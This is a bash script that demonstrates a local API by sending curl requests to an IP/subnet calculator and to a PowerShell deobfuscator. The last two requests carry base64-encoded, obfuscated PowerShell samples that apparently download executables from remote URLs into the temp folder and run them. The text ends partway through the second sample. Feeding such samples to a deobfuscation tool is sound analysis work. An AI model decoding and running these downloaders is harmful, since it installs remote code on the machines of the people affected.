#!/bin/bash


#POST Text 1
echo -e "\n\n\n\nSend IP: 124.62.23.211  with CIDR /28 to API\n"
sleep 2
#Printing echo of command so user informed
echo -e curl -X POST http://:****/ip_subnet/124.62.23.211/28
sleep 1.5
echo -e "\n"
sleep .8
#Sending curl request to API
curl -X POST http://:****/ip_subnet/124.62.23.211/28
#Sleep
sleep 2



#POST Text 2
echo -e "\n\n\n\nSend IP: 214.50.111.120  with Subnet Mask of 255.240.0.0 to API\n"
sleep 2
#Printing echo of command so user informed
echo curl -X POST http://:****/ip_subnet/214.50.111.120/255.240.0.0
sleep 1.5
echo -e "\n"
sleep .8
#Sending curl request to API
curl -X POST http://:****/ip_subnet/214.50.111.120/255.240.0.0
#Sleep
sleep 2



#POST Text 3
echo -e "\n\n\n\nSend IP: 20.124.83.1  with CIDR /21 to API\n"
sleep 2
#Printing echo of command so user informed
echo -e curl -O -X POST http://:****/ip_subnet/20.124.83.1/21
sleep 1.5
echo -e "\n"
sleep .8
#Sending curl request to API
curl -O -X POST http://:****/ip_subnet/20.124.83.1/21
#Sleep
sleep 2



#Post Text 4
echo -e "\n\n\n\nSend obfuscated powershell to API\n"
sleep 2
#Printing echo of command so user informed
echo curl -X POST http://:****/powershell_deobfuscator/JAB7AFcAYABTAGMAUgBgAGkAcAB0AH0AIAA9ACAALgAoACIAewAyAH0AewAwAH0AewAxAH0AIgAtAGYAJwBlAHcALQBvAGIAagAnACwAJwBlAGMAdAAnACwAJwBuACcAKQAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIAAoACIAewAxAH0AewAwAH0AewAyAH0AIgAgAC0AZgAnAGwAJwAsACcAVwBTAGMAcgBpAHAAdAAuAFMAaABlACcALAAnAGwAJwApADsAJAB7AHcAZQBiAGMAYABsAGkARQBgAE4AVAB9ACAAPQAgACYAKAAiAHsAMwB9AHsAMQB9AHsAMAB9AHsAMgB9ACIALQBmACcAagBlAGMAJwAsACcAdwAtAG8AYgAnACwAJwB0ACcALAAnAG4AZQAnACkAIAAoACIAewAwAH0AewAyAH0AewAxAH0AewAzAH0AIgAgAC0AZgAgACcAUwAnACwAJwBlAHQALgBXACcALAAnAHkAcwB0AGUAbQAuAE4AJwAsACcAZQBiAEMAbABpAGUAbgB0ACcAKQA7ACQAewByAGAAQQBgAE4AZABvAE0AfQAgAD0AIAAuACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiACAALQBmACcAbgBlACcALAAnAHcALQBvACcALAAnAGIAagBlAGMAdAAnACkAIAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAG0AJwAsACcAcgBhAG4AZABvACcAKQA7ACQAewB1AGAAUgBsAHMAfQAgAD0AIAAoACIAewAyADMAfQB7ADIAMgB9AHsAMgA0AH0AewA4AH0AewAxAH0AewAxADkAfQB7ADIAMQB9AHsAMwB9AHsANAB9AHsAOQB9AHsAMgB9AHsAMQAzAH0AewAxADUAfQB7ADEAMgB9AHsANgB9AHsAMQAxAH0AewAxADAAfQB7ADcAfQB7ADEANwB9AHsAMQA0AH0AewAxADYAfQB7ADUAfQB7ADEAOAB9AHsAMgAwAH0AewAwAH0AIgAgAC0AZgAgACcAZAAuAG4AbwAvAGsAdwBrAGMAYwBtAC8AJwAsACcAdABwADoALwAvACcALAAnAEcALwAnACwAJwBlAGwALgBkAGUAJwAsACcALwBDAGoAUABEACcALAAnAG8AbQAvAG8AJwAsACcAYwBuAGUAcgBkAC4AJwAsACcAZABpAGcAaQAnACwAJwB0ACcALAAnAFIAWQBTACcALAAnAGQAWgAvACwAaAB0AHQAcAA6AC8ALwAnACwAJwBjAG8AbQAvAEQAZwBKACcALAAnAHUAcwBpACcALAAnACwAJwAsACcAYQByAHQAcwB0AGEAdABpAG8AbgAnACwAJwBoAHQAdABwADoALwAvAHQAaABlAG0AJwAsACcALgBjACcALAAnAHQAYQBsACcALAAnAG8AaQBOAHkALwAsAGgAdAB0AHAAOgAvAC8AJwAsACcAcgAnACwAJwBhAHMAbwB1AG4AJwAsACcAYQBuAG8AawAnACwAJwB2AGkAYQBsAC4AYwAnACwAJwBoAHQAdABwADoALwAvAHQAaABpAGIAYQB1AHQAJwAsACcAbwBtAC8AeABVAFkAWgBKAHoAeABvAC8ALABoACcAKQAuACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAHQAJwAsACcAUwBwAGwAaQAnACkALgBJAG4AdgBvAGsAZQAoACcALAAnACkAOwAkAHsAbgBgAEEAbQBlAH0AIAA9ACAAJAB7AFIAYQBOAGQAYABPAE0AfQAuACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACcAZQB4AHQAJwAsACcAbgAnACkALgBJAG4AdgBvAGsAZQAoADEALAAgADYANQA1ADMANgApADsAJAB7AFAAYABBAHQASAB9ACAAPQAgACQAewBFAE4AVgA6AHQAYABFAGAATQBwAH0AIAArACAAJwBcACcAIAArACAAJAB7AE4AQQBgAG0ARQB9ACAAKwAgACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwAuAGUAeAAnACwAJwBlACcAKQA7AGYAbwByAGUAYQBjAGgAKAAkAHsAdQBgAFIATAB9ACAAaQBuACAAJAB7AFUAUgBgAEwAcwB9ACkAewB0AHIAeQB7ACQAewB3AEUAYABCAGMAbABpAGUAYABOAHQAfQAuACgAIgB7ADAAfQB7ADIAfQB7ADEAfQAiACAALQBmACAAJwBEAG8AdwAnACwAJwBhAGQARgBpAGwAZQAnACwAJwBuAGwAbwAnACkALgBJAG4AdgBvAGsAZQAoACQAewBVAGAAUgBsAH0ALgAoACIAewAxAH0AewAwAH0AewAyAH0AIgAtAGYAIAAnAHQAcgBpAG4AJwAsACcAVABvAFMAJwAsACcAZwAnACkALgBJAG4AdgBvAGsAZQAoACkALAAgACQAewBQAGAAQQB0AGgAfQApADsAJgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAtAGYAIAAnAFMAdABhACcALAAnAHIAdAAtAFAAcgBvAGMAJwAsACcAZQBzAHMAJwApACAAJAB7AFAAYABBAFQAaAB9ADsAYgByAGUAYQBrADsAfQBjAGEAdABjAGgAewAuACgAIgB7ADIAfQB7ADMAfQB7ADAAfQB7ADEAfQAiAC0AZgAgACcALQAnACwAJwBoAG8AcwB0ACcALAAnAHcAcgAnACwAJwBpAHQAZQAnACkAIAAkAHsAXwB9AC4AIgBFAHgAYABjAGUAcABgAFQASQBPAG4AIgAuACIATQBgAEUAYABTAFMAQQBHAEUAIgA7AH0AfQANAAoA
sleep 1.5
echo -e "\n"
sleep .8
#Sending curl request to API
curl -X POST http://:****/powershell_deobfuscator/JAB7AFcAYABTAGMAUgBgAGkAcAB0AH0AIAA9ACAALgAoACIAewAyAH0AewAwAH0AewAxAH0AIgAtAGYAJwBlAHcALQBvAGIAagAnACwAJwBlAGMAdAAnACwAJwBuACcAKQAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIAAoACIAewAxAH0AewAwAH0AewAyAH0AIgAgAC0AZgAnAGwAJwAsACcAVwBTAGMAcgBpAHAAdAAuAFMAaABlACcALAAnAGwAJwApADsAJAB7AHcAZQBiAGMAYABsAGkARQBgAE4AVAB9ACAAPQAgACYAKAAiAHsAMwB9AHsAMQB9AHsAMAB9AHsAMgB9ACIALQBmACcAagBlAGMAJwAsACcAdwAtAG8AYgAnACwAJwB0ACcALAAnAG4AZQAnACkAIAAoACIAewAwAH0AewAyAH0AewAxAH0AewAzAH0AIgAgAC0AZgAgACcAUwAnACwAJwBlAHQALgBXACcALAAnAHkAcwB0AGUAbQAuAE4AJwAsACcAZQBiAEMAbABpAGUAbgB0ACcAKQA7ACQAewByAGAAQQBgAE4AZABvAE0AfQAgAD0AIAAuACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiACAALQBmACcAbgBlACcALAAnAHcALQBvACcALAAnAGIAagBlAGMAdAAnACkAIAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAG0AJwAsACcAcgBhAG4AZABvACcAKQA7ACQAewB1AGAAUgBsAHMAfQAgAD0AIAAoACIAewAyADMAfQB7ADIAMgB9AHsAMgA0AH0AewA4AH0AewAxAH0AewAxADkAfQB7ADIAMQB9AHsAMwB9AHsANAB9AHsAOQB9AHsAMgB9AHsAMQAzAH0AewAxADUAfQB7ADEAMgB9AHsANgB9AHsAMQAxAH0AewAxADAAfQB7ADcAfQB7ADEANwB9AHsAMQA0AH0AewAxADYAfQB7ADUAfQB7ADEAOAB9AHsAMgAwAH0AewAwAH0AIgAgAC0AZgAgACcAZAAuAG4AbwAvAGsAdwBrAGMAYwBtAC8AJwAsACcAdABwADoALwAvACcALAAnAEcALwAnACwAJwBlAGwALgBkAGUAJwAsACcALwBDAGoAUABEACcALAAnAG8AbQAvAG8AJwAsACcAYwBuAGUAcgBkAC4AJwAsACcAZABpAGcAaQAnACwAJwB0ACcALAAnAFIAWQBTACcALAAnAGQAWgAvACwAaAB0AHQAcAA6AC8ALwAnACwAJwBjAG8AbQAvAEQAZwBKACcALAAnAHUAcwBpACcALAAnACwAJwAsACcAYQByAHQAcwB0AGEAdABpAG8AbgAnACwAJwBoAHQAdABwADoALwAvAHQAaABlAG0AJwAsACcALgBjACcALAAnAHQAYQBsACcALAAnAG8AaQBOAHkALwAsAGgAdAB0AHAAOgAvAC8AJwAsACcAcgAnACwAJwBhAHMAbwB1AG4AJwAsACcAYQBuAG8AawAnACwAJwB2AGkAYQBsAC4AYwAnACwAJwBoAHQAdABwADoALwAvAHQAaABpAGIAYQB1AHQAJwAsACcAbwBtAC8AeABVAFkAWgBKAHoAeABvAC8ALABoACcAKQAuACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAHQAJwAsACcAUwBwAGwAaQAnACkALgBJAG4AdgBvAGsAZQAoACcALAAnACkAOwAkAHsAbgBgAEEAbQBlAH0AIAA9ACAAJAB7AFIAYQBOAGQAYABPAE0AfQAuACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACcAZQB4AHQAJwAsACcAbgAnACkALgBJAG4AdgBvAGsAZQAoADEALAAgADYANQA1ADMANgApADsAJAB7AFAAYABBAHQASAB9ACAAPQAgACQAewBFAE4AVgA6AHQAYABFAGAATQBwAH0AIAArACAAJwBcACcAIAArACAAJAB7AE4AQQBgAG0ARQB9ACAAKwAgACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwAuAGUAeAAnACwAJwBlACcAKQA7AGYAbwByAGUAYQBjAGgAKAAkAHsAdQBgAFIATAB9ACAAaQBuACAAJAB7AFUAUgBgAEwAcwB9ACkAewB0AHIAeQB7ACQAewB3AEUAYABCAGMAbABpAGUAYABOAHQAfQAuACgAIgB7ADAAfQB7ADIAfQB7ADEAfQAiACAALQBmACAAJwBEAG8AdwAnACwAJwBhAGQARgBpAGwAZQAnACwAJwBuAGwAbwAnACkALgBJAG4AdgBvAGsAZQAoACQAewBVAGAAUgBsAH0ALgAoACIAewAxAH0AewAwAH0AewAyAH0AIgAtAGYAIAAnAHQAcgBpAG4AJwAsACcAVABvAFMAJwAsACcAZwAnACkALgBJAG4AdgBvAGsAZQAoACkALAAgACQAewBQAGAAQQB0AGgAfQApADsAJgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAtAGYAIAAnAFMAdABhACcALAAnAHIAdAAtAFAAcgBvAGMAJwAsACcAZQBzAHMAJwApACAAJAB7AFAAYABBAFQAaAB9ADsAYgByAGUAYQBrADsAfQBjAGEAdABjAGgAewAuACgAIgB7ADIAfQB7ADMAfQB7ADAAfQB7ADEAfQAiAC0AZgAgACcALQAnACwAJwBoAG8AcwB0ACcALAAnAHcAcgAnACwAJwBpAHQAZQAnACkAIAAkAHsAXwB9AC4AIgBFAHgAYABjAGUAcABgAFQASQBPAG4AIgAuACIATQBgAEUAYABTAFMAQQBHAEUAIgA7AH0AfQANAAoA
#Sleep
sleep 2



#Post Text 5
echo -e "\n\n\n\nSend obfuscated powershell to API\n"
sleep 2
#Printing echo of command so user informed
echo curl -X POST http://:****/powershell_deobfuscator/IgAkACgAcwBFAHQALQBJAFQAZQBtACAAJwBWAEEAUgBJAEEAYgBsAGUAOgBPAEYAUwAnACAAIAAnACcAKQAgACIAKwAgAFsAcwBUAHIASQBuAEcAXQAoACAAKAAgADMANgAsADEAMQA5ACwAMQAxADUALAAgADkAOQAgACwAMQAxADQAIAAsADEAMAA1ACAALAAxADEAMgAgACwAIAAxADEANgAgACwAMwAyACAALAA2ADEAIAAsACAAMwAyACwAIAAxADEAMAAgACwAIAAxADAAMQAgACwAIAAxADEAOQAsACAANAA1ACwAMQAxADEALAA5ADgAIAAsACAAMQAwADYAIAAsACAAMQAwADEALAA5ADkALAAxADEANgAgACwAMwAyACAALAA0ADUAIAAsACAANgA3ACwAMQAxADEAIAAsACAAMQAwADkAIAAsACAANwA5ACwAOQA4ACAALAAxADAANgAgACwAMQAwADEALAA5ADkALAAgADEAMQA2ACwAIAAzADIALAA4ADcAIAAsACAAOAAzACwAOQA5ACwAMQAxADQAIAAsADEAMAA1ACwAMQAxADIAIAAsACAAMQAxADYAIAAsADQANgAsACAAOAAzACwAIAAxADAANAAgACwAMQAwADEAIAAsACAAMQAwADgAIAAsADEAMAA4ACwANQA5ACAALAAgADMANgAgACwAMQAxADkAIAAsADEAMAAxACAALAA5ADgALAA5ADkAIAAsADEAMAA4ACwAMQAwADUAIAAsADEAMAAxACwAIAAxADEAMAAgACwAMQAxADYALAAgADMAMgAsADYAMQAsACAAMwAyACAALAAgADEAMQAwACwAMQAwADEALAAgADEAMQA5ACAALAAgADQANQAgACwAMQAxADEAIAAsACAAOQA4ACwAIAAxADAANgAsACAAMQAwADEAIAAsACAAOQA5ACwAMQAxADYAIAAsADMAMgAgACwAOAAzACAALAAgADEAMgAxACAALAAxADEANQAgACwAIAAxADEANgAgACwAIAAxADAAMQAsACAAMQAwADkAIAAsACAANAA2ACwAIAA3ADgAIAAsADEAMAAxACwAMQAxADYALAA0ADYAIAAsACAAOAA3ACAALAAgADEAMAAxACAALAAgADkAOAAgACwANgA3ACwAIAAxADAAOAAgACwAIAAxADAANQAsADEAMAAxACwAIAAxADEAMAAsACAAMQAxADYAIAAsADUAOQAgACwAIAAzADYAIAAsADEAMQA0ACAALAA5ADcAIAAsACAAMQAxADAALAAxADAAMAAgACwAMQAxADEALAAgADEAMAA5ACwAIAAzADIAIAAsADYAMQAsACAAMwAyACwAMQAxADAAIAAsADEAMAAxACAALAAxADEAOQAgACwANAA1ACwAIAAxADEAMQAsACAAOQA4ACwAMQAwADYAIAAsADEAMAAxACwAOQA5ACwAIAAxADEANgAgACwAIAAzADIALAAgADEAMQA0ACAALAAgADkANwAsADEAMQAwACwAMQAwADAALAAgADEAMQAxACAALAAxADAAOQAsACAANQA5ACAALAAzADYALAAxADEANwAgACwAIAAxADEANAAgACwAMQAwADgAIAAsADEAMQA1ACAALAAzADIAIAAsACAANgAxACAALAAgADMAMgAsADMAOQAgACwAMQAwADQAIAAsADEAMQA2ACAALAAxADEANgAgACwAIAAxADEAMgAgACwAIAA1ADgALAAgADQANwAgACwAIAA0ADcAIAAsACAAMQAwADgALAAgADEAMgAxACAALAAxADAAOQAgACwAIAA5ADcALAAxADEAMAAgACwAMQAwADUAIAAsADEAMQA2ACAALAAxADAAMQAgACwANAA2ACAALAAgADkAOQAgACwAIAAxADEAMQAsACAAMQAwADkAIAAsADQANwAsADgAMgAsACAAMQAxADkAIAAsACAAOQA3ACAALAAgADgAOQAsADEAMAAzACwAOQA3ACwAMQAwADkALAA2ADgAIAAsACAANAA3ACwANAA0ACwAMQAwADQAIAAsADEAMQA2ACAALAAxADEANgAgACwAIAAxADEAMgAgACwANQA4ACAALAAgADQANwAsACAANAA3ACwAMQAwADQAIAAsADkANwAgACwAIAAxADAAOAAgACwAOQA3ACAALAAgADEAMQA0ACAALAAxADAANQAgACwAMQAxADUALAA0ADYAIAAsACAAOQA5ACAALAAxADEAMQAsACAAMQAwADkAIAAsADQANwAsADcAMQAgACwAIAA3ADIAIAAsADEAMAAxACwANAA3ACAALAAgADQANAAsADEAMAA0ACAALAAxADEANgAsACAAMQAxADYALAAgADEAMQAyACAALAA1ADgAIAAsADQANwAgACwAIAA0ADcAIAAsACAAMQAwADgALAAgADEAMQAxACAALAAgADEAMQA4ACwAMQAwADEAIAAsADEAMQAwACAALAAgADEAMAAwACAALAAxADEANwAgACwAIAAxADEANQAgACwAMQAwADcALAAgADEAMAA1ACAALAAgADQANgAgACwAOQA5ACwAIAAxADEAMQAgACwAMQAwADkALAA0ADcAIAAsACAAMQAxADkALAA2ADkALAAxADEANQAsACAAMQAwADYALAAxADAANAAsADcAOAAgACwAMQAwADAAIAAsACAANAA3ACwANAA0ACAALAAgADEAMAA0ACAALAAgADEAMQA2ACwAIAAxADEANgAsADEAMQAyACAALAA1ADgALAA0ADcALAA0ADcAIAAsADkANwAsADEAMQAyACwAIAAxADAAMQAsACAAMQAxADQAIAAsADEAMAAyACwAMQAwADEAIAAsACAAOQA5ACAALAAxADEANgAsADEAMAA1ACAALAAgADEAMAA5ACwAIAA5ADcAIAAsACAAMQAwADMAIAAsACAAMQAwADEAIAAsACAANAA2ACwAMQAxADIAIAAsADEAMAA4ACwAIAA0ADcALAAgADQANwAgACwANwAyACAALAAgADgANwAgACwAMQAwADkAIAAsACAAMQAxADkAIAAsADQANwAsACAANAA0ACwAIAAxADAANAAsACAAMQAxADYAIAAsACAAMQAxADYALAAxADEAMgAgACwAIAA1ADgALAAgADQANwAsACAANAA3ACAALAAgADEAMAA4ACAALAAxADEANwAsACAAMQAyADAALAAgADEAMAA5ACwAIAAxADAAMQAgACwAMQAwADAAIAAsACAAMQAwADUAIAAsACAAOQA3ACAALAAgADQANgAsACAAOQA5ACAALAAxADEAMQAsACAAMQAwADkALAA0ADYAIAAsACAAMQAxADIALAAgADEAMAA4ACwAIAA0ADcAIAAsADEAMQAyACAALAAgADEAMQAxACAALAAxADEANAAgACwAMQAxADYALAAxADAAMgAsACAAMQAxADEALAAgADEAMAA4ACwAIAAxADAANQAgACwAMQAxADEALAA0ADcALAAgADEAMQAxACAALAAgADEAMAAzACwAOQAwACwAIAA0ADcAIAAsACAAMwA5ACwAIAA0ADYALAAgADgAMwAsADEAMQAyACwAMQAwADgALAAxADAANQAsADEAMQA2ACwANAAwACwAIAAzADkALAA0ADQALAAgADMAOQAsACAANAAxACwAIAA1ADkALAAgADMANgAsACAAMQAxADAALAAgADkANwAsACAAMQAwADkAIAAsACAAMQAwADEAIAAsADMAMgAgACwANgAxACwAMwAyACwAIAAzADYALAAgADEAMQA0ACwAOQA3ACAALAAxADEAMAAgACwAIAAxADAAMAAgACwAIAAxADEAMQAsADEAMAA5ACwANAA2ACwAIAAxADEAMAAsADEAMAAxACAALAAxADIAMAAgACwAIAAxADEANgAgACwANAAwACAALAAgADQAOQAsADQANAAsACAAMwAyACAALAA1ADQALAAgADUAMwAgACwANQAzACAALAAgADUAMQAgACwANQA0ACwAIAA0ADEALAA1ADkALAAgADMANgAsADEAMQAyACwAOQA3ACAALAAxADEANgAsACAAMQAwADQAIAAsACAAMwAyACwAIAA2ADEAIAAsADMAMgAgACwAIAAzADYALAAxADAAMQAsACAAMQAxADAALAAgADEAMQA4ACAALAAgADUAOAAsADEAMQA2ACwAMQAwADEAIAAsACAAMQAwADkAIAAsADEAMQAyACAALAAzADIALAA0ADMAIAAsADMAMgAsACAAMwA5ACAALAA5ADIAIAAsACAAMwA5ACwAMwAyACwAIAA0ADMAIAAsADMAMgAgACwAIAAzADYAIAAsACAAMQAxADAAIAAsADkANwAsACAAMQAwADkAIAAsADEAMAAxACwAMwAyACAALAA0ADMAIAAsADMAMgAsADMAOQAgACwANAA2ACAALAAgADEAMAAxACwAMQAyADAAIAAsACAAMQAwADEALAAzADkALAAgADUAOQAgACwAIAAxADAAMgAsADEAMQAxACwAMQAxADQALAAxADAAMQAsACAAOQA3ACwAOQA5ACAALAAxADAANAAsADQAMAAsADMANgAsACAAMQAxADcAIAAsADEAMQA0ACwAIAAxADAAOAAsACAAMwAyACwAIAAxADAANQAsADEAMQAwACwAMwAyACwAIAAzADYAIAAsADEAMQA3ACwAIAAxADEANAAgACwAIAAxADAAOAAgACwAIAAxADEANQAgACwAIAA0ADEAIAAsACAAMQAyADMALAAxADEANgAsACAAMQAxADQALAAgADEAMgAxACwAMQAyADMAIAAsACAAMwA2ACAALAAxADEAOQAgACwAIAAxADAAMQAgACwAOQA4ACwAOQA5ACAALAAxADAAOAAsACAAMQAwADUAIAAsACAAMQAwADEAIAAsACAAMQAxADAAIAAsACAAMQAxADYAIAAsADQANgAsACAANgA4ACwAIAAxADEAMQAsACAAMQAxADkAIAAsADEAMQAwACwAMQAwADgAIAAsADEAMQAxACwAOQA3ACAALAAxADAAMAAsADcAMAAsADEAMAA1ACAALAAgADEAMAA4ACAALAAxADAAMQAgACwAIAA0ADAAIAAsADMANgAsACAAMQAxADcALAAgADEAMQA0ACAALAAgADEAMAA4ACAALAAgADQANgAsACAAOAA0ACAALAAxADEAMQAgACwAIAA4ADMAIAAsACAAMQAxADYALAAgADEAMQA0ACwAIAAxADAANQAsADEAMQAwACwAIAAxADAAMwAsADQAMAAsACAANAAxACwANAA0ACwAMwAyACAALAAzADYAIAAsADEAMQAyACAALAAgADkANwAgACwAIAAxADEANgAsADEAMAA0ACAALAAgADQAMQAsADUAOQAgACwAOAAzACwAMQAxADYALAA5ADcALAAxADEANAAsADEAMQA2ACwANAA1ACAALAAgADgAMAAgACwAIAAxADEANAAgACwAIAAxADEAMQAgACwAIAA5ADkAIAAsACAAMQAwADEALAAgADEAMQA1ACAALAAxADEANQAgACwAMwAyACAALAAzADYAIAAsACAAMQAxADIALAA5ADcALAAgADEAMQA2ACwAMQAwADQALAA1ADkAIAAsADkAOAAgACwAIAAxADEANAAsADEAMAAxACwAIAA5ADcALAAgADEAMAA3ACAALAAgADUAOQAsACAAMQAyADUALAAgADkAOQAsADkANwAgACwAIAAxADEANgAgACwAIAA5ADkALAAgADEAMAA0ACwAIAAxADIAMwAgACwAIAAxADEAOQAsACAAMQAxADQAIAAsACAAMQAwADUAIAAsADEAMQA2ACAALAAgADEAMAAxACwANAA1ACAALAAgADEAMAA0ACAALAAgADEAMQAxACAALAAxADEANQAsACAAMQAxADYALAAgADMAMgAgACwAIAAzADYAIAAsADkANQAsADQANgAgACwAIAA2ADkAIAAsADEAMgAwACwAIAA5ADkAIAAsACAAMQAwADEALAAxADEAMgAgACwAMQAxADYALAAxADAANQAgACwAMQAxADEAIAAsADEAMQAwACwANAA2ACwAIAA3ADcALAAgADEAMAAxACAALAAgADEAMQA1ACAALAAgADEAMQA1ACAALAAgADkANwAgACwAMQAwADMALAAxADAAMQAsACAANQA5ACwAIAAxADIANQAsACAAMQAyADUAKQAgAHwAIABmAG8AUgBFAEEAYwBIACAAewAgACgAWwBJAG4AdABdACAAJABfAC0AQQBzAFsAYwBoAGEAcgBdACkAfQApACsAIgAgACQAKABzAGUAdAAtAEkAdABlAG0AIAAgACcAVgBhAFIASQBBAEIATABlADoATwBGAHMAJwAgACcAIAAnACAAKQAiAHwAJgAgACgAIAAkAEUATgBWADoAQwBvAE0AUwBwAGUAYwBbADQALAAyADYALAAyADUAXQAtAEoAbwBJAE4AJwAnACkADQAKAA==
sleep 1.5
echo -e "\n"
sleep .8
#Sending curl request to API
curl -X POST http://:****/powershell_deobfuscator/IgAkACgAcwBFAHQALQBJAFQAZQBtACAAJwBWAEEAUgBJAEEAYgBsAGUAOgBPAEYAUwAnACAAIAAnACcAKQAgACIAKwAgAFsAcwBUAHIASQBuAEcAXQAoACAAKAAgADMANgAsADEAMQA5ACwAMQAxADUALAAgADkAOQAgACwAMQAxADQAIAAsADEAMAA1ACAALAAxADEAMgAgACwAIAAxADEANgAgACwAMwAyACAALAA2ADEAIAAsACAAMwAyACwAIAAxADEAMAAgACwAIAAxADAAMQAgACwAIAAxADEAOQAsACAANAA1ACwAMQAxADEALAA5ADgAIAAsACAAMQAwADYAIAAsACAAMQAwADEALAA5ADkALAAxADEANgAgACwAMwAyACAALAA0ADUAIAAsACAANgA3ACwAMQAxADEAIAAsACAAMQAwADkAIAAsACAANwA5ACwAOQA4ACAALAAxADAANgAgACwAMQAwADEALAA5ADkALAAgADEAMQA2ACwAIAAzADIALAA4ADcAIAAsACAAOAAzACwAOQA5ACwAMQAxADQAIAAsADEAMAA1ACwAMQAxADIAIAAsACAAMQAxADYAIAAsADQANgAsACAAOAAzACwAIAAxADAANAAgACwAMQAwADEAIAAsACAAMQAwADgAIAAsADEAMAA4ACwANQA5ACAALAAgADMANgAgACwAMQAxADkAIAAsADEAMAAxACAALAA5ADgALAA5ADkAIAAsADEAMAA4ACwAMQAwADUAIAAsADEAMAAxACwAIAAxADEAMAAgACwAMQAxADYALAAgADMAMgAsADYAMQAsACAAMwAyACAALAAgADEAMQAwACwAMQAwADEALAAgADEAMQA5ACAALAAgADQANQAgACwAMQAxADEAIAAsACAAOQA4ACwAIAAxADAANgAsACAAMQAwADEAIAAsACAAOQA5ACwAMQAxADYAIAAsADMAMgAgACwAOAAzACAALAAgADEAMgAxACAALAAxADEANQAgACwAIAAxADEANgAgACwAIAAxADAAMQAsACAAMQAwADkAIAAsACAANAA2ACwAIAA3ADgAIAAsADEAMAAxACwAMQAxADYALAA0ADYAIAAsACAAOAA3ACAALAAgADEAMAAxACAALAAgADkAOAAgACwANgA3ACwAIAAxADAAOAAgACwAIAAxADAANQAsADEAMAAxACwAIAAxADEAMAAsACAAMQAxADYAIAAsADUAOQAgACwAIAAzADYAIAAsADEAMQA0ACAALAA5ADcAIAAsACAAMQAxADAALAAxADAAMAAgACwAMQAxADEALAAgADEAMAA5ACwAIAAzADIAIAAsADYAMQAsACAAMwAyACwAMQAxADAAIAAsADEAMAAxACAALAAxADEAOQAgACwANAA1ACwAIAAxADEAMQAsACAAOQA4ACwAMQAwADYAIAAsADEAMAAxACwAOQA5ACwAIAAxADEANgAgACwAIAAzADIALAAgADEAMQA0ACAALAAgADkANwAsADEAMQAwACwAMQAwADAALAAgADEAMQAxACAALAAxADAAOQAsACAANQA5ACAALAAzADYALAAxADEANwAgACwAIAAxADEANAAgACwAMQAwADgAIAAsADEAMQA1ACAALAAzADIAIAAsACAANgAxACAALAAgADMAMgAsADMAOQAgACwAMQAwADQAIAAsADEAMQA2ACAALAAxADEANgAgACwAIAAxADEAMgAgACwAIAA1ADgALAAgADQANwAgACwAIAA0ADcAIAAsACAAMQAwADgALAAgADEAMgAxACAALAAxADAAOQAgACwAIAA5ADcALAAxADEAMAAgACwAMQAwADUAIAAsADEAMQA2ACAALAAxADAAMQAgACwANAA2ACAALAAgADkAOQAgACwAIAAxADEAMQAsACAAMQAwADkAIAAsADQANwAsADgAMgAsACAAMQAxADkAIAAsACAAOQA3ACAALAAgADgAOQAsADEAMAAzACwAOQA3ACwAMQAwADkALAA2ADgAIAAsACAANAA3ACwANAA0ACwAMQAwADQAIAAsADEAMQA2ACAALAAxADEANgAgACwAIAAxADEAMgAgACwANQA4ACAALAAgADQANwAsACAANAA3ACwAMQAwADQAIAAsADkANwAgACwAIAAxADAAOAAgACwAOQA3ACAALAAgADEAMQA0ACAALAAxADAANQAgACwAMQAxADUALAA0ADYAIAAsACAAOQA5ACAALAAxADEAMQAsACAAMQAwADkAIAAsADQANwAsADcAMQAgACwAIAA3ADIAIAAsADEAMAAxACwANAA3ACAALAAgADQANAAsADEAMAA0ACAALAAxADEANgAsACAAMQAxADYALAAgADEAMQAyACAALAA1ADgAIAAsADQANwAgACwAIAA0ADcAIAAsACAAMQAwADgALAAgADEAMQAxACAALAAgADEAMQA4ACwAMQAwADEAIAAsADEAMQAwACAALAAgADEAMAAwACAALAAxADEANwAgACwAIAAxADEANQAgACwAMQAwADcALAAgADEAMAA1ACAALAAgADQANgAgACwAOQA5ACwAIAAxADEAMQAgACwAMQAwADkALAA0ADcAIAAsACAAMQAxADkALAA2ADkALAAxADEANQAsACAAMQAwADYALAAxADAANAAsADcAOAAgACwAMQAwADAAIAAsACAANAA3ACwANAA0ACAALAAgADEAMAA0ACAALAAgADEAMQA2ACwAIAAxADEANgAsADEAMQAyACAALAA1ADgALAA0ADcALAA0ADcAIAAsADkANwAsADEAMQAyACwAIAAxADAAMQAsACAAMQAxADQAIAAsADEAMAAyACwAMQAwADEAIAAsACAAOQA5ACAALAAxADEANgAsADEAMAA1ACAALAAgADEAMAA5ACwAIAA5ADcAIAAsACAAMQAwADMAIAAsACAAMQAwADEAIAAsACAANAA2ACwAMQAxADIAIAAsADEAMAA4ACwAIAA0ADcALAAgADQANwAgACwANwAyACAALAAgADgANwAgACwAMQAwADkAIAAsACAAMQAxADkAIAAsADQANwAsACAANAA0ACwAIAAxADAANAAsACAAMQAxADYAIAAsACAAMQAxADYALAAxADEAMgAgACwAIAA1ADgALAAgADQANwAsACAANAA3ACAALAAgADEAMAA4ACAALAAxADEANwAsACAAMQAyADAALAAgADEAMAA5ACwAIAAxADAAMQAgACwAMQAwADAAIAAsACAAMQAwADUAIAAsACAAOQA3ACAALAAgADQANgAsACAAOQA5ACAALAAxADEAMQAsACAAMQAwADkALAA0ADYAIAAsACAAMQAxADIALAAgADEAMAA4ACwAIAA0ADcAIAAsADEAMQAyACAALAAgADEAMQAxACAALAAxADEANAAgACwAMQAxADYALAAxADAAMgAsACAAMQAxADEALAAgADEAMAA4ACwAIAAxADAANQAgACwAMQAxADEALAA0ADcALAAgADEAMQAxACAALAAgADEAMAAzACwAOQAwACwAIAA0ADcAIAAsACAAMwA5ACwAIAA0ADYALAAgADgAMwAsADEAMQAyACwAMQAwADgALAAxADAANQAsADEAMQA2ACwANAAwACwAIAAzADkALAA0ADQALAAgADMAOQAsACAANAA